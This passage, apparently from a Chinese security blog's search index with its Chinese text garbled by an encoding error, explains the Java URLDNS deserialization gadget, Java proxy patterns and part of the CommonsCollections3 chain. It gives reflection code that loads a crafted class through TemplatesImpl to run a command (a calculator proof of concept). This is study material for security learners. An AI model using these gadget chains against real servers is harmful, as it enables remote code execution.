is Serializable, URL as the key is what triggers the DNS lookup.                Reflections.setFieldValue(u, \"hashCode\", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.                return ht;        }        public static void main(final String[] args) throws Exception {                PayloadRunner.run(URLDNS.class, args);        }        /**         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior         * using the serialized object.&lt;/p&gt;         *         * &lt;b&gt;Potential false negative:&lt;/b&gt;         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the         * second resolution.&lt;/p&gt;         */        static class SilentURLStreamHandler extends URLStreamHandler {                protected URLConnection openConnection(URL u) throws IOException {                        return null;                }                protected synchronized InetAddress getHostAddress(URL u) {                        return null;                }        }}\n\nä¸€ç‚¹ç‚¹åˆ†æä¸€ä¸‹ï¼Œé¦–å…ˆä»URLçš„åˆ›å»ºå¼€å§‹ï¼š\nURLStreamHandler handler = new SilentURLStreamHandler();                HashMap ht = new HashMap(); // HashMap that will contain the URL                URL u = new URL(null, url, handler); // URL to use as the Key                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.\n\n\nå…ˆæ˜¯ç”¨URLStreamHandlercåˆ›å»ºäº†ä¸€ä¸ªå¥æŸ„ï¼Œè¿™ä¸ªå¥æŸ„å¯ä»¥æ‰“å¼€ä¸€ä¸ªæŒ‡å®šçš„urlã€‚\nåˆ›å»ºä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œå¹¶å°†urlå¯¹è±¡uä½œä¸ºkeyå­˜å…¥åˆ°äº†å“ˆå¸Œè¡¨ä¸­ã€‚\n\nReflections.setFieldValue(u, \"hashCode\", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.                return ht;        }        public static void main(final String[] args) throws Exception {                PayloadRunner.run(URLDNS.class, args);        }\n\n\nè¿™é‡Œå°†urlå¯¹è±¡uçš„hashCodeè®¾ç½®æˆäº†-1ï¼Œä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšæˆ‘ä»¬ä¸€ä¼šåœ¨åˆ†æå…·ä½“çš„è§¦å‘è¿‡ç¨‹æ—¶ä¼šæåˆ°ã€‚\nè¿”å›äº†å“ˆå¸Œè¡¨å¯¹è±¡htï¼Œå¹¶ç”¨PayloadRunnerè¿è¡Œè¯¥åˆ©ç”¨é“¾ã€‚\n\nè¿™æ®µä»£ç å°±å¹²äº†è¿™äº›äº‹ï¼Œé‚£ä¹ˆæ˜¯æ€ä¹ˆè§¦å‘ååºåˆ—åŒ–çš„å‘¢ï¼Œæˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡åœ¨ååºåˆ—åŒ–æ—¶ä¼šè§¦å‘readObjectï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å»çœ‹Hashmapçš„readObjectæ–¹æ³•ï¼š\n\næœ€é‡è¦çš„ä¸€è¡Œå°±æ˜¯æœ€åçš„putValueï¼Œé‡Œé¢è®¡ç®—äº†å“ˆå¸Œè¡¨çš„é”®åã€‚æˆ‘ä»¬è·Ÿä¸€ä¸‹putValueæ–¹æ³•ï¼Œå‘ç°åˆ©ç”¨hashæ–¹æ³•è®¡ç®—äº†å“ˆå¸Œè¡¨çš„keyã€‚\n\næˆ‘ä»¬å†ç»§ç»­è·Ÿè¿›hashæ–¹æ³•ï¼Œå‘ç°è¿™é‡Œè°ƒç”¨äº†å“ˆå¸Œè¡¨keyçš„hashcodeæ–¹æ³•ï¼Œæˆ‘ä»¬å›åˆ°åˆšæ‰åˆ›å»ºå“ˆå¸Œè¡¨æ—¶ï¼Œæ˜¯æŠŠurlå¯¹è±¡å­˜å…¥åˆ°äº†keyä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å»æ‰¾java.net.URLçš„hashCodeæ–¹æ³•ã€‚\n\n\nå¦‚æœhashCodeå€¼ä¸ä¸º-1ï¼Œé‚£ä¹ˆå°±ä¼šreturnï¼Œè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬å‰é¢æåˆ°è¦å°†hashCodeçš„å€¼è®¾ç½®ä¸º-1çš„åŸå› ã€‚\næˆ‘ä»¬ç»§ç»­è·Ÿï¼Œhandleræ­¤æ—¶æ˜¯ä¸€ä¸ªURLStreamHandlerå¯¹è±¡ï¼Œç»§ç»­è·Ÿè¿›å®ƒçš„hashCodeæ–¹æ³•ã€‚\n\nè¿™é‡Œè°ƒç”¨äº†getHostAddressæ–¹æ³•ï¼Œç»§ç»­è·Ÿã€‚\n\nåˆ°è¿™é‡Œå¯ä»¥çœ‹åˆ°InetAddress.getByName(host)çš„ä½œç”¨æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶ipåœ°å€ï¼Œåœ¨ç½‘ç»œä¸Šå°±æ˜¯ä¸€æ¬¡DNSæŸ¥è¯¢ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡burpçš„Collaborator clientæ¥çœ‹åˆ°è¿™æ¬¡urlè¯·æ±‚ã€‚\n\nä»£ç†æ¨¡å¼åœ¨Spirngä¸­ï¼ŒAOPçš„åº•å±‚å®ç°å°±æ˜¯ä»£ç†æ¨¡å¼ï¼Œä»£ç†æ¨¡å¼åˆ†ä¸ºä¸¤ç§ï¼š\n\né™æ€ä»£ç†\nåŠ¨æ€ä»£ç†\n\nä»€ä¹ˆæ˜¯ä»£ç†ï¼Ÿæˆ‘ä»¬ç”¨ä¸€ä¸ªç§Ÿæˆ¿çš„ä¾‹å­æ¥è¯´æ˜ï¼ŒæŒ‰ç…§æ­£å¸¸çš„é€»è¾‘æ¥è®²ï¼Œæˆ¿ä¸œæƒ³è¦å°†è‡ªå·±çš„æˆ¿å­å‡ºç§Ÿï¼Œå¹¶ä¸”æ­¤æ—¶æœ‰ä¸€ä¸ªç§Ÿå®¢æƒ³ç§Ÿè¿™ä¸ªæˆ¿å­ï¼Œé‚£ä¹ˆç§Ÿå®¢å°±å¯ä»¥ç›´æ¥æ‰¾åˆ°æˆ¿ä¸œå®Œæˆç§Ÿæˆ¿å­è¿™ä»¶äº‹ï¼š\n\nä½†æ˜¯ç°åœ¨æˆ¿ä¸œä¸æƒ³å¤„ç†ä¸€äº›åœ¨ç§Ÿæˆ¿è¿‡ç¨‹ä¸­éœ€è¦è¿›è¡Œçš„ç¹çæ­¥éª¤ï¼Œæ¯”å¦‚æ‰“å¹¿å‘Šå•Šï¼Œå’Œç§Ÿå®¢è®®ä»·ç­‰ç­‰ï¼Œæ‰€ä»¥è¿™æ—¶å€™å‡ºç°äº†ä¸€ä¸ªæ–°è§’è‰²ï¼Œå«åšä¸­ä»‹ï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ¿ä¸œæ‰€åšçš„äº‹åªæœ‰å‡ºç§Ÿè‡ªå·±çš„æˆ¿å­ï¼Œå…¶ä»–äº‹é¡¹å…¨éƒ¨äº¤ç”±ä¸­ä»‹æ¥åšï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ç§Ÿå®¢å¦‚æœæƒ³ç§Ÿæˆ¿å­æ˜¯ä¸èƒ½ç›´æ¥æ‰¾åˆ°æˆ¿ä¸œçš„ï¼Œå¿…é¡»åœ¨ä¸­é—´ç»ç”±ä¸­ä»‹ï¼Œä¸­ä»‹æ¥å®Œæˆå¤§éƒ¨åˆ†äº‹å®œï¼Œå¹¶ä¸”åœ¨æ­¤æ—¶ä¸­ä»‹ä¸æˆ¿ä¸œå…±åŒå®Œæˆç§Ÿæˆ¿è¿™ä»¶äº‹ï¼š\n\né™æ€ä»£ç†è§’è‰²åˆ†æï¼š\n\næŠ½è±¡è§’è‰²ï¼ˆç§Ÿæˆ¿è¿™ä»¶äº‹ï¼‰ï¼šä¸€èˆ¬ä¼šä½¿ç”¨æŠ½è±¡ç±»æˆ–è€…æ¥å£æ¥è§£å†³\nçœŸå®è§’è‰²ï¼ˆæˆ¿ä¸œï¼‰ï¼šè¢«ä»£ç†çš„è§’è‰²\nä»£ç†è§’è‰²ï¼ˆä¸­ä»‹ï¼‰ï¼šä»£ç†çœŸå®è§’è‰²ï¼Œä»£ç†çœŸå®è§’è‰²åï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šåšä¸€äº›é™„å±æ“ä½œ\nå®¢æˆ·ï¼ˆç§Ÿå®¢ï¼‰ï¼šè®¿é—®ä»£ç†å¯¹è±¡çš„äºº\n\nä»£ç å®ç°ï¼š\nç§Ÿæˆ¿ Rentæ¥å£ï¼š\npackage com.y1zh3e7.demo01;public interface Rent {    public void rent();}\n\næˆ¿ä¸œ Hostç±»ï¼š\npackage com.y1zh3e7.demo01;public class Host implements Rent{    public void rent()    {        System.out.println(\"æˆ¿ä¸œè¦å‡ºç§Ÿæˆ¿å­\");    }}\n\nä¸­ä»‹ Proxyç±»ï¼š\npackage com.y1zh3e7.demo01;public class Proxy implements Rent{    private Host host;    public Proxy() {    }    public Proxy(Host host) {        this.host = host;    }    public void rent(){        host.rent();        seeHouse();        getFare();    };    public void seeHouse()    {        System.out.println(\"ä¸­ä»‹å¸¦ä½ çœ‹æˆ¿\");    }    public void getFare()    {        System.out.println(\"ä¸­ä»‹æ”¶ä¸­ä»‹è´¹äº†\");    }}\n\nç§Ÿå®¢ Clientç±»ï¼š\npackage com.y1zh3e7.demo01;public class Client {    public static void main(String[] args) {        Host host = new Host();        Proxy proxy = new Proxy(host);    }}\n\nå¯ä»¥å‘ç°æˆ¿ä¸œåªä¸“æ³¨å®ç°äº†ç§Ÿæˆ¿è¿™ä»¶äº‹ï¼Œè€Œä¸­ä»‹ä¸ä»…å¸®æˆ¿ä¸œå®ç°äº†ç§Ÿæˆ¿ï¼Œè€Œä¸”è‡ªå·±ä¹Ÿæ·»åŠ äº†æ ¼å¤–çš„åŠŸèƒ½ï¼Œæ¯”å¦‚çœ‹æˆ¿æ”¶ä¸­ä»‹è´¹ç­‰ç­‰ã€‚\nä»£ç†æ¨¡å¼çš„å¥½å¤„ï¼š\n\nå¯ä»¥æ—¶çœŸæ˜¯è§’è‰²çš„ç›®çš„æ›´åŠ çº¯ç²¹ï¼Œä¸ç”¨å»å…³æ³¨ä¸€äº›å…¬å…±çš„ä¸šåŠ¡\nå…¬å…±ä¸šåŠ¡äº¤ç»™ä»£ç†è§’è‰²ï¼Œå®ç°äº†ä¸šåŠ¡çš„åˆ†å·¥\nå…¬å…±ä¸šåŠ¡å‘ç”Ÿæ‰©å±•æ—¶ï¼Œä¾¿äºé›†ä¸­ç®¡ç†\n\nç¼ºç‚¹ï¼š\n\nä¸€ä¸ªçœŸå®è§’è‰²å°±ä¼šäº§ç”Ÿä¸€ä¸ªä»£ç†è§’è‰²ï¼Œä»£ç é‡ç¿»å€ï¼Œå¼€å‘æ•ˆç‡å˜ä½\n\nåŠ¨æ€ä»£ç†\nåŠ¨æ€ä»£ç†å’Œé™æ€ä»£ç†è§’è‰²ä¸€æ ·\nåŠ¨æ€ä»£ç†çš„ä»£ç†ç±»æ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä¸æ˜¯æˆ‘ä»¬ç›´æ¥å†™å¥½çš„\nåŠ¨æ€ä»£ç†åˆ†ä¸ºä¸‰å¤§ç±»ï¼š\nåŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†â€”â€”JDKçš„åŠ¨æ€ä»£ç†\nåŸºäºç±»çš„åŠ¨æ€ä»£ç†â€”â€”cglib\njavaå­—èŠ‚ç å®ç°â€”â€”Javassist\n\n\n\nåŠ¨æ€ä»£ç†éœ€è¦äº†è§£ä¸¤ä¸ªç±»ï¼šProxyï¼šä»£ç†ï¼ŒInvocationHandlerï¼šè°ƒç”¨å¤„ç†ç¨‹åº\næ•´ä¸ªåŠ¨æ€ä»£ç†å¤§æ¦‚æµç¨‹å¦‚ä¸‹ï¼š\n\nProxy.newProxyInstance ç”Ÿæˆä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡proxyï¼Œå¹¶ä¸”å‘Šè¯‰è¿™ä¸ªproxyè¦ä»£ç†å“ªä¸ªæ¥å£ï¼Œè¿™é‡Œæ³¨æ„æ­¤æ—¶å¿…é¡»è¦æ˜¯æ¥å£æ‰è¡Œï¼ŒåŠ¨æ€ä»£ç†æ˜¯æ— æ³•ä»£ç†ä¸€ä¸ªç±»çš„ï¼Œå› æ­¤å½“åŠ¨æ€ä»£ç†æ¥æ”¶åˆ°ä¸€ä¸ªç±»æ—¶è¦è½¬ä¸ºè¯¥ç±»æ‰€ç»§æ‰¿çš„æ¥å£ã€‚\nå®¢æˆ·è°ƒç”¨è¢«ä»£ç†å¯¹è±¡çš„æŸä¸€æ–¹æ³•ï¼Œæ­¤æ—¶javaä¼šå°†è®¿é—®ä»£ç†å¯¹è±¡è¿™ä¸ªè¯·æ±‚è½¬å‘ç»™åŠ¨æ€ä»£ç†å¯¹è±¡proxyï¼Œå¹¶ä¸”åœ¨proxyçš„invokeä¸­å®ç°è¯¥æ–¹æ³•\n\nä»£ç å®ç°ï¼šRentæ¥å£ è¢«ä»£ç†å¯¹è±¡å’Œproxyå¯¹è±¡å…±åŒå®ç°çš„æ¥å£ï¼š\npackage com.y1zh3e7.demo03;public interface Rent {    public void rent();}\n\nHost è¢«ä»£ç†å¯¹è±¡:\npackage com.y1zh3e7.demo03;public class Host implements Rent {    public void rent()    {        System.out.println(\"æˆ¿ä¸œè¦å‡ºç§Ÿæˆ¿å­\");    }}\n\nåŠ¨æ€ä»£ç†å·¥å…·ç±» ProxyInvocationHandlerï¼š\npackage com.y1zh3e7.demo03;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class ProxyInvocationHandler implements InvocationHandler {    private Rent rent;\t\t// ä½¿ç”¨åŠ¨æ€ä»£ç†æ—¶é€šè¿‡setterä¼ å…¥è¦è¢«ä»£ç†çš„å¯¹è±¡    public void setRent(Rent rent) {        this.rent = rent;    }\t\t// é€šè¿‡getProxyæ–¹æ³•è·å¾—ä¸€ä¸ªåŠ¨æ€ä»£ç†å®ä¾‹    public Object getProxy()    {\t\t\t// é€šè¿‡Proxy.newProxyInstanceåˆå§‹åŒ–ä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡å‡ºæ¥ ä¸‰ä¸ªå‚æ•°åŸºæœ¬ä¸Šåªæœ‰ç¬¬äºŒä¸ªæ˜¯å˜åŒ–çš„ï¼Œä¸ºè¢«ä»£ç†çš„æ¥å£ï¼Œå…¶ä»–ä¸¤ä¸ªå‚æ•°å¯ä»¥åƒè¿™é‡Œä¸€æ ·å†™æ­»        return Proxy.newProxyInstance(this.getClass().getClassLoader(), rent.getClass().getInterfaces(), this);    }    @Override\t\t// å½“è°ƒç”¨ä¸€ä¸ªè¢«ä»£ç†å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œä¼šåœ¨æ­¤å¤„æ‰§è¡Œï¼Œinvokeå†…å¯ä»¥è‡ªå·±æ„é€ å¦‚ä½•æ‰§è¡Œè¯¥æ–¹æ³•ï¼Œä»è€Œè¾¾åˆ°äº†æ‰©å±•æ–¹æ³•åŠŸèƒ½çš„ç›®çš„\t\t// ä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸º ä»£ç†å¯¹è±¡ ä»£ç†å¯¹è±¡è¢«è°ƒç”¨çš„æ–¹æ³• è°ƒç”¨è¯¥æ–¹æ³•çš„å‚æ•°    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {       Object result =  method.invoke(rent,args);        return result;    }}\n\nClient\npackage com.y1zh3e7.demo03;public class Client {    public static void main(String[] args) {        Host host = new Host();        ProxyInvocationHandler pih = new ProxyInvocationHandler();        pih.setRent(host); // å°†è¦ä»£ç†çš„å¯¹è±¡è®¾ç½®ä¸ºhost        Rent proxy = (Rent) pih.getProxy(); // æ‹¿åˆ°è¢«ä»£ç†æ¥å£çš„ä»£ç†å¯¹è±¡        proxy.rent(); // è°ƒç”¨è¯¥æ–¹æ³•åä¼šå°†è¿™ä¸ªæ–¹æ³•ä¼ ç»™ä»£ç†å¯¹è±¡ä¸­çš„invokeæ–¹æ³•æ¥æ‰§è¡Œ    }}\n","categories":["WebSec"],"tags":["Javaååºåˆ—åŒ–"]},{"title":"CommonsCollections3","url":"/2023/05/20/CommonsCollections3/","content":"CC1æ‰“ä¸é€šæ—¶çš„å¦å¤–ä¸€æ¡é“¾CC3åœ¨CC1å’ŒCC6ä¸­ï¼Œæˆ‘ä»¬æœ€ç»ˆå¼¹è®¡ç®—å™¨éƒ½æ˜¯é€šè¿‡Runtime.execè¿›è¡Œè°ƒç”¨ï¼Œä»CC3æˆ‘ä»¬è¦ä»‹ç»ä¸€ç§ä¸é€šè¿‡Runtimeæ¥å¼¹è®¡ç®—å™¨çš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯Javaä¸­å¸¸æåˆ°çš„åŠ¨æ€ç±»åŠ è½½ï¼ŒåŠ¨æ€ç±»åŠ è½½å¯ä»¥è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªè·¯å¾„æ¥åŠ è½½ä¸€ä¸ªæ¶æ„ç±»ï¼Œå¦‚æœè¿™ä¸ªæ¶æ„ç±»åœ¨é™æ€ä»£ç å—æˆ–æ„é€ ä»£ç å—ä¸­å†™å…¥äº†æ¶æ„æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ‰¾ä¸€æ¡é“¾å­æ¥åˆå§‹åŒ–è¿™ä¸ªç±»ï¼ˆä¸€èˆ¬åœ¨è¿›è¡Œå®ä¾‹åŒ–æ—¶ä¼šå¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ï¼‰ï¼Œä»è€Œè¾¾åˆ°ä»£ç å—ä¸­çš„ä»£ç æ‰§è¡Œã€‚\nClassLoaderä¸­çš„defineClassæœ€ç»ˆå®ç°äº†ç±»çš„åŠ¨æ€åŠ è½½ï¼ˆåé¢è¿˜æœ‰ä¸€äº›è¿‡ç¨‹ä½†å·²ç»æ˜¯ä¾é cæ¥å®ç°çš„äº†ï¼‰ï¼Œåœ¨ClassLoaderä¸­å¯ä»¥çœ‹åˆ°ä¸€å †defineClassï¼Œæˆ‘ä»¬æŸ¥æ‰¾ç”¨æ³•ï¼Œçœ‹ä¸€ä¸‹å“ªä¸ªdefineClassåœ¨åˆ«å¤„è¢«è°ƒç”¨äº†ï¼Œè€Œä¸”æƒé™æœ€å¥½æ˜¯defaultæˆ–è€…publicï¼Œæ–¹ä¾¿æˆ‘ä»¬åˆ©ç”¨ï¼Œæœ€ç»ˆé”å®šä¸‹é¢è¿™ä¸ªï¼š\nprotected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len)        throws ClassFormatError\n\nè¿™ä¸ªdefineClassè¢«è°ƒç”¨çš„ç‚¹åœ¨com.sun.org.apache.xalan.internal.xsltc.traxä¸­çš„TemplatesImpl.TransletClassLoaderä¸‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªdefineClassï¼š\n\nè¿™ä¸ªdefineClassåˆåœ¨å½“å‰ç±»ä¸­è¢«defineTransletClassesè°ƒç”¨ï¼š\n\ndefineTransletClassesåŒç±»ä¸‹æœ‰ä¸‰ä¸ªè¢«è°ƒç”¨ç‚¹ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å“ªä¸ªæ–¹æ³•å¯ä»¥è¢«æˆ‘ä»¬åˆ©ç”¨ï¼š\n\nç¬¬ä¸€ä¸ªè¿”å›_classï¼š\nprivate synchronized Class[] getTransletClasses() {        try {            if (_class == null) defineTransletClasses();        }        catch (TransformerConfigurationException e) {            // Falls through        }        return _class;    }\n\nç¬¬äºŒä¸ªè¿”å›äº†_classçš„ä¸‹æ ‡ï¼š\npublic synchronized int getTransletIndex() {        try {            if (_class == null) defineTransletClasses();        }        catch (TransformerConfigurationException e) {            // Falls through        }        return _transletIndex;    }\n\nç¬¬ä¸‰ä¸ªæ–¹æ³•æˆ‘ä»¬ä¸»è¦çœ‹newInstanceè¿™é‡Œï¼Œè¿™ä¸ª_class[_transletIndex]å¯æ§ï¼ˆé€šè¿‡ä¸Šé¢æ‰¾åˆ°çš„defineTransletClassesåŠ¨æ€åŠ è½½è¿›æ¥ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬è®©_classä¸ºæˆ‘ä»¬æ‰€æ„é€ çš„æ¶æ„ç±»å¹¶è®©å®ƒnewInstanceï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰§è¡Œæ¶æ„ç±»ä¸­çš„é™æ€/æ„é€ ä»£ç å—ä¸­çš„ä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ç€æ‰¾è¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼š\nprivate Translet getTransletInstance()        throws TransformerConfigurationException {        try {            if (_name == null) return null;            if (_class == null) defineTransletClasses();            // The translet needs to keep a reference to all its auxiliary            // class to prevent the GC from collecting them            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();\n\nä¸‹ä¸€è°ƒç”¨ç‚¹è¿˜æ˜¯åœ¨è¿™ä¸ªç±»ä¸­ï¼Œæˆ‘ä»¬æ‰¾åˆ°newTransformer()è¿™ä¸ªæ–¹æ³•ï¼š\npublic synchronized Transformer newTransformer()        throws TransformerConfigurationException    {        TransformerImpl transformer;        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,            _indentNumber, _tfactory);\n\næˆ‘ä»¬æ¥æ¢³ç†ä¸€ä¸‹åˆ°ç›®å‰çš„è°ƒç”¨é“¾ï¼Œå¾ˆçŸ­ä¹Ÿå¾ˆæ–¹ä¾¿ï¼š\n\næˆ‘ä»¬å…ˆå°†payloadå†™å‡ºæ¥ï¼š\nTemplatesImpl templatesimpl = new TemplatesImpl();        templatesimpl.newTransformer();\n\nå†™å®Œå•¦ ä¸‹ç­ï¼ï¼ˆå¼€ä¸ªç©ç¬‘ï¼‰é€»è¾‘ä¸Šæ¥è¯´è¿™ä¸¤è¡Œä»£ç ç¡®å®æ˜¯å®Œæ•´çš„è°ƒç”¨é“¾ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯å¯¹ç±»å†…éƒ¨çš„å„ç§å±æ€§è¿›è¡Œèµ‹å€¼ï¼š\nnewTransformerå†…ä¸éœ€è¦è¿›è¡Œèµ‹å€¼æ“ä½œï¼Œè·Ÿè¿›åˆ°getTransletInstanceä¸­ ï¼Œç±»å†…æ²¡æœ‰å¯¹_nameå’Œ_classè¿›è¡Œèµ‹å€¼ï¼Œå¦‚æœæƒ³è¦è§¦å‘defineTransletClasses()æˆ‘ä»¬å°±éœ€è¦è®©_nameä¸ä¸ºç©ºï¼Œ_classä¸ºç©ºï¼Œç›´æ¥ä¸ç»™_classèµ‹å€¼å³å¯ï¼š\nif (_name == null) return null;if (_class == null) defineTransletClasses();\n\nç»§ç»­è·Ÿè¿›åˆ°defineTransletClassesä¸­ ï¼Œå¦‚æœæƒ³è¦èµ°åˆ°ä¸‹é¢åŠ¨æ€åŠ è½½_classï¼Œæˆ‘ä»¬è¿™é‡Œè¦æ³¨æ„å¯¹_tfactoryè¿›è¡Œèµ‹å€¼ï¼Œå¦åˆ™å¯¹ä¸€ä¸ªç©ºå±æ€§è°ƒç”¨æ–¹æ³•ï¼Œä¼šçˆ†ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼š\nreturn new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());\n\nä¸Šä¸€æ­¥ä¹‹åæˆ‘ä»¬åœ¨å¯¹_classèµ‹å€¼è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡ä¿®æ”¹_bytecodesä»è€Œæ§åˆ¶_classçš„å€¼ï¼š\nfor (int i = 0; i &lt; classCount; i++) {                _class[i] = loader.defineClass(_bytecodes[i]);\n\nä¸€å…±ä¸‰ä¸ªéœ€è¦ä¿®æ”¹çš„å€¼ï¼ŒTemplatesImplç±»æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡åå°„ä¿®æ”¹è¿™äº›å€¼ï¼Œçœ‹ä¸€ä¸‹è¿™å‡ ä¸ªå€¼çš„ç±»å‹:\nprivate String _name = null;private byte[][] _bytecodes = null;private transient TransformerFactoryImpl _tfactory = null;\n\néƒ½æ˜¯privateå±æ€§ï¼Œæ‰€ä»¥è¦ç”¨setAccessible æ¥ä¿®æ”¹è®¿é—®æƒé™ï¼Œnameæ˜¯Stringç±»å‹ï¼Œæ‰€ä»¥ç›´æ¥èµ‹ä¸ªå­—ç¬¦ä¸²å°±è¡Œï¼š\nClass tmp = templatesimpl.getClass();    Field nameField = tmp.getDeclaredField(\"_name\");    nameField.setAccessible(true);    nameField.set(templatesimpl,\"y1\");\n\nå†çœ‹_bytecodesï¼Œä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œä½†æˆ‘ä»¬åœ¨ç»™_classèµ‹å€¼æ—¶defineClassæ¥å—çš„å´æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼š\nfor (int i = 0; i &lt; classCount; i++) {                _class[i] = loader.defineClass(_bytecodes[i]);Class defineClass(final byte[] b) {            return defineClass(null, b, 0, b.length);\n\næ‰€ä»¥æˆ‘ä»¬ç»™_bytecodes èµ‹å€¼æ—¶å¯ä»¥å°†defineClassæ¥æ”¶çš„ä¸€ç»´æ•°ç»„æ”¾è¿›_bytecodesè¿™ä¸ªäºŒç»´æ•°ç»„ä¸­ï¼Œè¿™æ ·åœ¨è¿›è¡Œforå¾ªç¯éå†æ—¶å°±å¯ä»¥å°†è¿™ä¸ªä¸€ç»´æ•°ç»„éå†å‡ºæ¥å¹¶ä¼ ç»™defineClassï¼Œè¿™ä¸ªclasséœ€è¦æˆ‘ä»¬åœ¨å†™å¥½javaæºç åæ‰‹åŠ¨ç¼–è¯‘ä¸ºclassæ–‡ä»¶ï¼Œæœ€å¥½æŠŠè¿™ä¸ªclassæ–‡ä»¶å¤åˆ¶åˆ°ç”µè„‘ä¸Šçš„åˆ«çš„åœ°æ–¹å†åœ¨è¿™é‡Œä½¿ç”¨ï¼ˆç¼–è¯‘åçš„classæ–‡ä»¶ä¸€èˆ¬åœ¨targetä¸‹ï¼‰ï¼š\nField bytecodesField = tmp.getDeclaredField(\"_bytecodes\");        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/Desktop/Test.class\"));        byte[][] codes = {code};        bytecodesField.set(templatesimpl,codes);\n\nTest.classpublic class Calc {    static{        try {            Runtime.getRuntime().exec(\"open -na Calculator\"); //è¿™é‡Œæ˜¯macå¼¹è®¡ç®—å™¨çš„å‘½ä»¤        } catch (IOException e) {                             //winä¸‹è¿˜æ˜¯calc            throw new RuntimeException(e);        }    }}\n\nç„¶åæˆ‘ä»¬å†æ¥æ”¹_tfactoryçš„å€¼ï¼š\nè¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œè¢«transientå…³é”®å­—ä¿®é¥°çš„å±æ€§æ˜¯ä¸å‚ä¸åºåˆ—åŒ–çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å°±ç®—æˆ‘ä»¬é€šè¿‡åå°„ä¿®æ”¹äº†å®ƒçš„å€¼ï¼Œååºåˆ—åŒ–åçš„äºŒè¿›åˆ¶æµè¿™ä¸ªå±æ€§çš„å€¼ä¹Ÿä¾æ—§æ˜¯nullï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¦ç”¨å…¶ä»–çš„æ–¹å¼èµ‹å€¼\nprivate transient TransformerFactoryImpl _tfactory = null;\n\næˆ‘ä»¬åœ¨readObjectä¸­å‘ç°æœ‰å¯¹è¿™äº›å±æ€§è¿›è¡Œèµ‹å€¼çš„æ“ä½œï¼Œ_tfactoryçš„å€¼æ˜¯ä¸€ä¸ªTransformerFactoryImplå®ä¾‹ï¼š\n_name = (String)gf.get(\"_name\", null);   //ä»¥ä¸‹å‡ è¡Œä»£ç å¯¹åºåˆ—åŒ–æµä¸­çš„å±æ€§è¯»å–å®ƒä»¬çš„å€¼ï¼Œå¦‚æœè¯»ä¸åˆ°å€¼é‚£ä¹ˆå°†å®ƒçš„å€¼è®¾ä¸ºé»˜è®¤å€¼ï¼ˆç¬¬äºŒä¸ªå‚æ•°ï¼‰    \t\t\t  _bytecodes = (byte[][])gf.get(\"_bytecodes\", null);        _class = (Class[])gf.get(\"_class\", null);        _transletIndex = gf.get(\"_transletIndex\", -1);        _outputProperties = (Properties)gf.get(\"_outputProperties\", null);        _indentNumber = gf.get(\"_indentNumber\", 0);        if (is.readBoolean()) {            _uriResolver = (URIResolver) is.readObject();        }        _tfactory = new TransformerFactoryImpl();    